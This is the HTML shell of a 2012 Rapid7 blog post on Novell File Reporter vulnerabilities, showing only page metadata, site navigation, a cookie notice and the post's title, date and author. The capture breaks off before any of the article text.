

<!DOCTYPE html>
<html class="no-js" lang="en" dir="ltr">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>New 0day Exploits: Novell File Reporter Vulnerabilities | Rapid7 Blog</title>


    <meta property="og:url" content="https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/" />
    <link rel="canonical" href="https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/" />
    <link rel="alternate" href="https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/" hreflang="en" />

    
    <meta name="robots" content="index, follow" />
    <meta name="title" content="New 0day Exploits: Novell File Reporter Vulnerabilities | Rapid7 Blog" />
    <meta name="description" />
    <meta property="og:title" content="New 0day Exploits: Novell File Reporter Vulnerabilities | Rapid7 Blog" />
    <meta property="og:image" content="https://blog.rapid7.com/content/images/post-feature-images/post-img-12590.jpg" />
    <meta name="twitter:image" content="https://blog.rapid7.com/content/images/post-feature-images/post-img-12590.jpg" />
    <meta name="twitter:title" content="New 0day Exploits: Novell File Reporter Vulnerabilities | Rapid7 Blog">
    <meta name="twitter:card" content="summary_large_image">
    <meta property="og:site_name" content="Rapid7" />
    <meta property="og:description" />
    <link rel="stylesheet" href="/includes/css/all.min.css?cb=1635259399378">





    <meta name="facetcat" content="blog" />


    <script>
        var gIp = {"countryIsoCode":"CA","subdivisionIsoCode":"AB","continentIsoCode":"NA"};

        window.dataLayer = window.dataLayer || [];
        window.dataLayer.push({
'conversionType': 'secondary',                    });
        window.dataLayer.push({ 'auth': false });
         window.dataLayer.push({ 'ip': '161.184.30.132' });
        window.dataLayer.push({ 'isTrialUser': false, 'isCustomer': false });
    </script>

    <!-- Optimizely -->
    <script src="https://cdn.optimizely.com/js/10801744121.js"></script>


    <script>
        (function (w, d, s, l, i) {
            w[l] = w[l] || []; w[l].push({
                'gtm.start':
                    new Date().getTime(), event: 'gtm.js'
            }); var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-WBTPTVC');</script>


    <link rel="icon" type="image/x-icon" href="/includes/img/favicon.ico">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Muli:800,900|Roboto:300,400,700|Noto+Sans+JP">
    <script src="/includes/js/jquery.min.js"></script>
    <script src="/includes/js/populateCountryState.js"></script>
    <script src="//information.rapid7.com/js/forms2/js/forms2.min.js"></script>
    
    
    <meta property="og:type" content="article" />
        <meta property="article:published_time" content="2012-11-16T15:29:00" />
            <meta property="article:modified_time" content="2017-09-27T00:20:01" />
    
        <script src="//app-sj20.marketo.com/js/forms2/js/forms2.min.js"></script>

    <script type="application/ld+json">
        {
           "@context":"https://schema.org",
           "@type":"Article",
           "publisher":{
              "@type":"Organization",
              "name":"Rapid7 Blog",
              "logo":{
                 "@type":"ImageObject",
                 "url":"https://www.rapid7.com/favicon.ico",
                 "width":60,
                 "height":60
              }
           },
           "author":{
              "@type":"Person",
              "name":"Juan Vazquez",
              "image":{
                 "@type":"ImageObject",
                 "url":"https://rapid7.com/globalassets/_images/blog-author-images/author-icon-7621.png"
              },
              "url":"https://www.rapid7.com/blog/author/juan-vazquez/",
              "sameAs":[]
           },
           "headline": "New 0day Exploits: Novell File Reporter Vulnerabilities",
           "url":"https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/",
           "image":{
              "@type":"ImageObject",
              "url":"https://blog.rapid7.com/content/images/post-feature-images/post-img-12590.jpg"
           },
           "keywords":"",
           "description": null,
           "mainEntityOfPage":{
              "@type":"WebPage",
              "@id":"https://www.rapid7.com/"
           },
                 "datePublished":"2012-11-16T15:29:00",
                             "dateModified":"2017-09-27T00:20:01"
        }
    </script>

    <style type="text/css">
        body .mktoForm .mktoFormCol,
        body .mktoForm .mktoFormRow {
            float: none;
        }

        #modal-subscribe h2 {
            padding-bottom: .25rem;
        }
    </style>


</head>
<body  class="pg-id-29536">
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WBTPTVC" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
    
    

    <div id="gdprAlert" class="overlay" style="display:none;">
        <div class="gdpr-modal">
            <div>
                <h6>Quick Cookie Notification</h6>
                <p>This site uses cookies, including for analytics, personalization, and advertising purposes. For more information or to change your cookie settings, <a href="/privacy-policy/tracking-technologies/" target="_blank" rel="noopener">click here</a>. <br /><br />If you continue to browse this site without changing your cookie settings, you agree to this use.</p>
                <button class="button mdBtn blue" id="gdprClose">I AGREE, LET’S GO!</button>
                <hr>
                <div class="fineprint">
                    <p class="fineprint">View <a href="/privacy-policy/tracking-technologies/" target="_blank" rel="noopener">Cookie Policy</a> for full details</p>
                </div>
            </div>
        </div>
    </div>

    <div id="__"></div>
    <!--[if lte IE 9]>
    <div id="ie-conditional"><spa>Your IE browser is out of date - Upgrade to the latest version of IE or Chrome for an optimal website experience.</span> <a href="https://support.microsoft.com/en-us/help/17621/internet-explorer-downloads" title="Upgrade IE Now" class="button smBtn darkClear" target="_blank">Upgrade IE Now</a>
    <button class="close-button" type="button" id="closeIEBar">
        <img src="../includes/img/close_white.svg">
    </button>
    </div>
    <![endif]-->

    


<div class="off-canvas-wrapper">
    <div class="off-canvas-wrapper-inner" data-off-canvas-wrapper>
        
        <div id="r7-global-nav">
            <header class="r7-nav mobile"><section class="search-bar search-bar--mobile hide animate-out"><form action="/search"><div class="container flex flex-jc-c flex-ai-c"><div class="search-content flex flex-jc-fs flex-ai-c"><i class="r7-icon r7-icon-search-magnify"></i><input type="search" class="search-input" name="q" placeholder="Search"/><input type="submit" class="search-submit button blue" value="Search"/><a id="btnSearchCloseMobile" class="search-close"><i class="r7-icon r7-icon-delete-x"></i></a></div></div></form></section><div class="search-overlay search-overlay--mobile overlay "></div><nav class="main-nav "><div class="container flex flex-jc-sb flex-ai-c"><div class="flex flex-jc-c flex-ai-c"><a class="main-nav__toggle"><i class="r7-icon text-white"></i></a></div><a class="main-nav__logo flex flex-jc-c flex-ai-c text-center" href="https://www.rapid7.com/" target=""><img src="/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg" alt="Rapid7 Home"/></a><a class="search flex flex-jc-c flex-ai-c"><i class="r7-icon r7-icon-search-magnify text-white"></i></a></div><div class="main-nav__links flex flex-jc-c"><ul><li class="main-nav__link dropdown  "><a class="dropdown-trigger has-toggle" href="/products/">Products</a><div class="dropdown-content two-col"><ul class="dropdown-menu"><li class="dropdown-title">Insight Solutions</li><li class="dropdown-item"><a href="/products/insightidr/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">InsightIDR<div class="dropdown-category">User Behavior Analytics &amp; SIEM</div></div></a></li><li class="dropdown-item"><a href="/products/insightvm/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">InsightVM<div class="dropdown-category">Vulnerability Management</div></div></a></li><li class="dropdown-item"><a href="/products/insightappsec/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">InsightAppSec<div class="dropdown-category">Dynamic Application Security Testing</div></div></a></li><li class="dropdown-item"><a href="/products/insightconnect/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">InsightConnect<div class="dropdown-category">Orchestration &amp; Automation</div></div></a></li><li class="dropdown-item"><a href="/products/threat-command/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">Threat Command<div class="dropdown-category">Threat Intelligence</div></div></a></li><li class="dropdown-item"><a href="/products/insightcloudsec/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">InsightCloudSec<div class="dropdown-category">Cloud Security</div></div></a></li></ul><ul class="dropdown-menu"><li class="dropdown-title">More Solutions</li><li class="dropdown-item"><a href="/products/metasploit/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-report.svg&#x27;)"></div><div class="dropdown-text">Metasploit<div class="dropdown-category">Penetration Testing</div></div></a></li><li class="dropdown-item"><a href="/products/nexpose/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-report.svg&#x27;)"></div><div class="dropdown-text">Nexpose<div class="dropdown-category">Vulnerability Management On-Premises</div></div></a></li><li class="dropdown-item"><a href="/products/tcell/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-report.svg&#x27;)"></div><div class="dropdown-text">tCell by Rapid7<div class="dropdown-category">Application Monitoring &amp; Protection</div></div></a></li></ul><div class="dropdown-view-all flex flex-jc-sb flex-ai-c"><a href="/products/insight-platform/">Insight Platform</a><a href="/try/insight/" class="button blue">Free Trial</a></div></div></li><li class="main-nav__link dropdown  "><a class="dropdown-trigger has-toggle" href="/services/">Services</a><div class="dropdown-content true"><ul class="dropdown-menu"><li class="dropdown-title">SERVICES</li><li class="dropdown-item"><a href="/services/managed-services/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-diamond-person.svg&#x27;)"></div><div class="dropdown-text">Managed Services<div class="dropdown-category">OPERATIONS, ASSESSMENTS &amp; REPORTING</div></div></a></li><li class="dropdown-item"><a href="/services/security-consulting/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-shield.svg&#x27;)"></div><div class="dropdown-text">Security Consulting<div class="dropdown-category">ASSESSMENT, TESTING &amp; RESPONSE</div></div></a></li><li class="dropdown-item"><a href="/services/product-consulting/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-report.svg&#x27;)"></div><div class="dropdown-text">Product Consulting<div class="dropdown-category">QUICK-START &amp; CONFIGURATION</div></div></a></li><li class="dropdown-item"><a href="/services/training-certification/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-book-open.svg&#x27;)"></div><div class="dropdown-text">Training &amp; Certification<div class="dropdown-category">SKILLS &amp; ADVANCEMENT</div></div></a></li><li class="dropdown-item"><a href="/services/support-and-customer-success/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/user-customer-service-call.svg&#x27;)"></div><div class="dropdown-text">Customer Success<div class="dropdown-category">ONE-STOP SUPPORT CENTER</div></div></a></li><li class="dropdown-item"><a href="/services/premium-support/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/premium-support-icon.svg&#x27;)"></div><div class="dropdown-text">Premium Support<div class="dropdown-category">PRIORITY HELP &amp; FASTER SOLUTIONS</div></div></a></li></ul></div></li><li class="main-nav__link dropdown  "><a class="dropdown-trigger has-toggle" href="">Support &amp; Resources</a><div class="dropdown-content two-col"><ul class="dropdown-menu"><li class="dropdown-title">SUPPORT </li><li class="dropdown-item"><a href="/for-customers/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-monitor.svg&#x27;)"></div><div class="dropdown-text">Support Portal<div class="dropdown-category">CONTACT CUSTOMER SUPPORT</div></div></a></li><li class="dropdown-item"><a href="https://docs.rapid7.com/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-notes.svg&#x27;)"></div><div class="dropdown-text">Product Documentation<div class="dropdown-category">EXPLORE PRODUCT GUIDES</div></div></a></li><li class="dropdown-item"><a href="https://docs.rapid7.com/release-notes/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-report.svg&#x27;)"></div><div class="dropdown-text">Release Notes<div class="dropdown-category">DISCOVER THE LATEST PRODUCT UPDATES</div></div></a></li><li class="dropdown-item"><a href="/contact/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-envelope-email-checked-okay.svg&#x27;)"></div><div class="dropdown-text">Contact Us<div class="dropdown-category">TALK TO SALES</div></div></a></li></ul><ul class="dropdown-menu"><li class="dropdown-title">RESOURCES</li><li class="dropdown-item"><a href="/fundamentals/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-book-open.svg&#x27;)"></div><div class="dropdown-text">Fundamentals<div class="dropdown-category">FOUNDATIONAL SECURITY KNOWLEDGE</div></div></a></li><li class="dropdown-item"><a href="/blog/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-signal-wifi.svg&#x27;)"></div><div class="dropdown-text">Blog<div class="dropdown-category">THE LATEST INDUSTRY NEWS AND SECURITY EXPERTISE</div></div></a></li><li class="dropdown-item"><a href="/resources/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-note-authenticate.svg&#x27;)"></div><div class="dropdown-text">Resources Library<div class="dropdown-category">E-BOOKS, WHITE PAPERS, VIDEOS &amp; BRIEFS</div></div></a></li><li class="dropdown-item"><a href="https://extensions.rapid7.com/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-plug-outlet-collection.svg&#x27;)"></div><div class="dropdown-text">Extensions Library<div class="dropdown-category">PLUGINS, INTEGRATIONS &amp; DEVELOPER COMMUNITY</div></div></a></li><li class="dropdown-item"><a href="/partners/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-partners.svg&#x27;)"></div><div class="dropdown-text">Partners<div class="dropdown-category">RAPID7 PARTNER ECOSYSTEM</div></div></a></li><li class="dropdown-item"><a href="/about/events-webcasts/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-community-users.svg&#x27;)"></div><div class="dropdown-text">Webcasts &amp; Events<div class="dropdown-category">UPCOMING OPPORTUNITIES TO CONNECT WITH US</div></div></a></li><li class="dropdown-item"><a href="/db/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-vulnerability.svg&#x27;)"></div><div class="dropdown-text">Vulnerability &amp; Exploit Database<div class="dropdown-category">SEARCH THE LATEST SECURITY RESEARCH</div></div></a></li></ul></div></li><li class="main-nav__link   "><a class="" href="/research/">Research</a></li><li class="dropdown  main-nav__link main-nav__link--sep"><a href="#" class="dropdown-trigger has-toggle ">en</a><div class="dropdown-content right-align"><ul class="dropdown-menu"><li class="dropdown-item selected"><a href="#">English</a></li><li class="dropdown-item "><a href="/de/blog/post/">Deutsch</a></li><li class="dropdown-item "><a href="/ja/blog/post/">日本語</a></li></ul></div></li><li class="main-nav__link"><a href="https://insight.rapid7.com/saml/SSO" class="has-icon"><img src="/Areas/Docs/includes/img/r7-nav/icon-lock.svg"/> Sign In</a></li></ul></div></nav><nav class="sub-nav container flex flex-ai-c"><div class="sub-nav__title"><a href="/blog/">Blog</a></div><ul><li class="sub-nav__link dropdown "><a class="dropdown-trigger has-toggle">Select</a><div class="dropdown-content"><ul class="dropdown-menu"><li class="dropdown-item"><a href="/blog/tag/vulnerability-management/">Vuln. Management</a></li><li class="dropdown-item"><a href="/blog/tag/detection-and-response">Detection &amp; Response</a></li><li class="dropdown-item"><a href="/blog/tag/application-security/">App Security</a></li><li class="dropdown-item"><a href="/blog/tag/research">Research</a></li><li class="dropdown-item"><a href="/blog/tag/cloud-security/">Cloud Security</a></li><li class="dropdown-item"><a href="/blog/tag/soar">SOAR</a></li><li class="dropdown-item"><a href="/blog/tag/metasploit">Metasploit</a></li><li class="dropdown-item"><a href="/blog/tags/">More...</a></li></ul></div></li></ul><a class="button solidYellow" href="/try/insight/">Try Now</a></nav></header><div class="dropdown-overlay overlay false"></div><header class="r7-nav"><nav class="main-nav"><div class="container flex flex-jc-sb flex-ai-c"><div class="main-nav__logo"><a class="flex" href="https://www.rapid7.com/" target=""><img src="/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg" alt="Rapid7 Home"/></a></div><div class="main-nav__links flex flex-jc-c"><ul><li class="main-nav__link dropdown  "><a class="dropdown-trigger has-toggle" href="/products/">Products</a><div class="dropdown-content two-col"><ul class="dropdown-menu"><li class="dropdown-title">Insight Solutions</li><li class="dropdown-item"><a href="/products/insightidr/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">InsightIDR<div class="dropdown-category">User Behavior Analytics &amp; SIEM</div></div></a></li><li class="dropdown-item"><a href="/products/insightvm/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">InsightVM<div class="dropdown-category">Vulnerability Management</div></div></a></li><li class="dropdown-item"><a href="/products/insightappsec/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">InsightAppSec<div class="dropdown-category">Dynamic Application Security Testing</div></div></a></li><li class="dropdown-item"><a href="/products/insightconnect/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">InsightConnect<div class="dropdown-category">Orchestration &amp; Automation</div></div></a></li><li class="dropdown-item"><a href="/products/threat-command/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">Threat Command<div class="dropdown-category">Threat Intelligence</div></div></a></li><li class="dropdown-item"><a href="/products/insightcloudsec/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;/Areas/Docs/includes/img/r7-nav/icon-cloud.svg&#x27;)"></div><div class="dropdown-text">InsightCloudSec<div class="dropdown-category">Cloud Security</div></div></a></li></ul><ul class="dropdown-menu"><li class="dropdown-title">More Solutions</li><li class="dropdown-item"><a href="/products/metasploit/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-report.svg&#x27;)"></div><div class="dropdown-text">Metasploit<div class="dropdown-category">Penetration Testing</div></div></a></li><li class="dropdown-item"><a href="/products/nexpose/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-report.svg&#x27;)"></div><div class="dropdown-text">Nexpose<div class="dropdown-category">Vulnerability Management On-Premises</div></div></a></li><li class="dropdown-item"><a href="/products/tcell/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-report.svg&#x27;)"></div><div class="dropdown-text">tCell by Rapid7<div class="dropdown-category">Application Monitoring &amp; Protection</div></div></a></li></ul><div class="dropdown-view-all flex flex-jc-sb flex-ai-c"><a href="/products/insight-platform/">Insight Platform</a><a href="/try/insight/" class="button blue">Free Trial</a></div></div></li><li class="main-nav__link dropdown  "><a class="dropdown-trigger has-toggle" href="/services/">Services</a><div class="dropdown-content true"><ul class="dropdown-menu"><li class="dropdown-title">SERVICES</li><li class="dropdown-item"><a href="/services/managed-services/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-diamond-person.svg&#x27;)"></div><div class="dropdown-text">Managed Services<div class="dropdown-category">OPERATIONS, ASSESSMENTS &amp; REPORTING</div></div></a></li><li class="dropdown-item"><a href="/services/security-consulting/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-shield.svg&#x27;)"></div><div class="dropdown-text">Security Consulting<div class="dropdown-category">ASSESSMENT, TESTING &amp; RESPONSE</div></div></a></li><li class="dropdown-item"><a href="/services/product-consulting/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-report.svg&#x27;)"></div><div class="dropdown-text">Product Consulting<div class="dropdown-category">QUICK-START &amp; CONFIGURATION</div></div></a></li><li class="dropdown-item"><a href="/services/training-certification/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-book-open.svg&#x27;)"></div><div class="dropdown-text">Training &amp; Certification<div class="dropdown-category">SKILLS &amp; ADVANCEMENT</div></div></a></li><li class="dropdown-item"><a href="/services/support-and-customer-success/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/user-customer-service-call.svg&#x27;)"></div><div class="dropdown-text">Customer Success<div class="dropdown-category">ONE-STOP SUPPORT CENTER</div></div></a></li><li class="dropdown-item"><a href="/services/premium-support/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/premium-support-icon.svg&#x27;)"></div><div class="dropdown-text">Premium Support<div class="dropdown-category">PRIORITY HELP &amp; FASTER SOLUTIONS</div></div></a></li></ul></div></li><li class="main-nav__link dropdown  "><a class="dropdown-trigger has-toggle" href="">Support &amp; Resources</a><div class="dropdown-content two-col"><ul class="dropdown-menu"><li class="dropdown-title">SUPPORT </li><li class="dropdown-item"><a href="/for-customers/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-monitor.svg&#x27;)"></div><div class="dropdown-text">Support Portal<div class="dropdown-category">CONTACT CUSTOMER SUPPORT</div></div></a></li><li class="dropdown-item"><a href="https://docs.rapid7.com/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-notes.svg&#x27;)"></div><div class="dropdown-text">Product Documentation<div class="dropdown-category">EXPLORE PRODUCT GUIDES</div></div></a></li><li class="dropdown-item"><a href="https://docs.rapid7.com/release-notes/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-report.svg&#x27;)"></div><div class="dropdown-text">Release Notes<div class="dropdown-category">DISCOVER THE LATEST PRODUCT UPDATES</div></div></a></li><li class="dropdown-item"><a href="/contact/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-envelope-email-checked-okay.svg&#x27;)"></div><div class="dropdown-text">Contact Us<div class="dropdown-category">TALK TO SALES</div></div></a></li></ul><ul class="dropdown-menu"><li class="dropdown-title">RESOURCES</li><li class="dropdown-item"><a href="/fundamentals/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-book-open.svg&#x27;)"></div><div class="dropdown-text">Fundamentals<div class="dropdown-category">FOUNDATIONAL SECURITY KNOWLEDGE</div></div></a></li><li class="dropdown-item"><a href="/blog/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-signal-wifi.svg&#x27;)"></div><div class="dropdown-text">Blog<div class="dropdown-category">THE LATEST INDUSTRY NEWS AND SECURITY EXPERTISE</div></div></a></li><li class="dropdown-item"><a href="/resources/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-note-authenticate.svg&#x27;)"></div><div class="dropdown-text">Resources Library<div class="dropdown-category">E-BOOKS, WHITE PAPERS, VIDEOS &amp; BRIEFS</div></div></a></li><li class="dropdown-item"><a href="https://extensions.rapid7.com/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-plug-outlet-collection.svg&#x27;)"></div><div class="dropdown-text">Extensions Library<div class="dropdown-category">PLUGINS, INTEGRATIONS &amp; DEVELOPER COMMUNITY</div></div></a></li><li class="dropdown-item"><a href="/partners/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-partners.svg&#x27;)"></div><div class="dropdown-text">Partners<div class="dropdown-category">RAPID7 PARTNER ECOSYSTEM</div></div></a></li><li class="dropdown-item"><a href="/about/events-webcasts/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-community-users.svg&#x27;)"></div><div class="dropdown-text">Webcasts &amp; Events<div class="dropdown-category">UPCOMING OPPORTUNITIES TO CONNECT WITH US</div></div></a></li><li class="dropdown-item"><a href="/db/" class="has-icon"><div class="dropdown-icon" style="background-image:url(&#x27;https://www.rapid7.com/globalassets/_icons/global-nav/icon-vulnerability.svg&#x27;)"></div><div class="dropdown-text">Vulnerability &amp; Exploit Database<div class="dropdown-category">SEARCH THE LATEST SECURITY RESEARCH</div></div></a></li></ul></div></li><li class="main-nav__link   "><a class="" href="/research/">Research</a></li></ul></div><div class="main-nav__utility"><ul><li class="dropdown  language"><a href="#" class="dropdown-trigger has-toggle ">en</a><div class="dropdown-content right-align"><ul class="dropdown-menu"><li class="dropdown-item selected"><a href="#">English</a></li><li class="dropdown-item "><a href="/de/blog/post/">Deutsch</a></li><li class="dropdown-item "><a href="/ja/blog/post/">日本語</a></li></ul></div></li><li class="signin"><a href="https://insight.rapid7.com/saml/SSO"><img src="/Areas/Docs/includes/img/r7-nav/icon-lock.svg"/>Sign In</a></li></ul></div></div></nav><section class="search-bar hide"><div class="container flex flex-jc-c flex-ai-c"><form action="/search" class="search-content flex flex-jc-c flex-ai-c"><i class="r7-icon r7-icon-search-magnify"></i><input type="search" class="search-input" name="q" placeholder="Search"/><input type="submit" class="search-submit button blue" value="Search"/><a class="search-close"><i class="r7-icon r7-icon-delete-x"></i></a></form></div></section><div class="search-overlay overlay "></div><nav class="sub-nav "><div class="container flex flex-jc-sb"><a class="logo circle-button" href="https://www.rapid7.com/"><img src="/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg" alt="Rapid7 logo"/></a><div class="sub-nav__links flex"><ul class="flex flex-ai-c"><li class="sub-nav__title"><a href="/blog/">Blog</a></li><li class="sub-nav__link flex flex-dir-col "><a href="/blog/tag/vulnerability-management/">Vuln. Management</a></li><li class="sub-nav__link flex flex-dir-col "><a href="/blog/tag/detection-and-response">Detection &amp; Response</a></li><li class="sub-nav__link flex flex-dir-col "><a href="/blog/tag/application-security/">App Security</a></li><li class="sub-nav__link flex flex-dir-col "><a href="/blog/tag/research">Research</a></li><li class="sub-nav__link flex flex-dir-col "><a href="/blog/tag/cloud-security/">Cloud Security</a></li><li class="sub-nav__link flex flex-dir-col "><a href="/blog/tag/soar">SOAR</a></li><li class="sub-nav__link flex flex-dir-col "><a href="/blog/tag/metasploit">Metasploit</a></li><li class="sub-nav__link flex flex-dir-col "><a href="/blog/tags/">More...</a></li></ul></div><div class="sub-nav__utility"><a class="search"><i class="r7-icon r7-icon-search-magnify"></i></a><a class="button solidYellow" href="/try/insight/">Try Now</a><a class="to-top circle-button"><i class="r7-icon r7-icon-arrow-chevron-up-solid"></i></a></div></div></nav></header>
        </div>

        <div class="off-canvas-content" data-off-canvas-content>
            <div id="menuOverlay" class="reveal-overlay"></div>

                <section class="longhero">
                    <div class="grid-container">
                        <div class="grid-x grid-padding-x expanded">
                            <div class="medium-12 cell">

                            </div>
                        </div>
                    </div>
                </section>
            



<div class="pageContent">
    <section class="blog-single-post">
        <div class="grid-container">
            <div class="grid-x grid-padding-x">
                <div class="small-12 medium-6 medium-offset-1 large-7 large-offset-1 cell blog-single-post__main-column">
                    <div class="grid-y">
                        <div class="blog-single-post__main-column--heading">
                            <h1>New 0day Exploits: Novell File Reporter Vulnerabilities</h1>
                            <div>
                                <ul class="blog-post-info">
                                        <li class="date">Nov 16, 2012</li>
                                                                            <li class="time">18 min read</li>
                                    <li class="name">
                                        <a href="/blog/author/juan-vazquez/">Juan Vazquez</a>
                                    </li>
                                </ul>
                                <ul class="blog-post-social float-right">
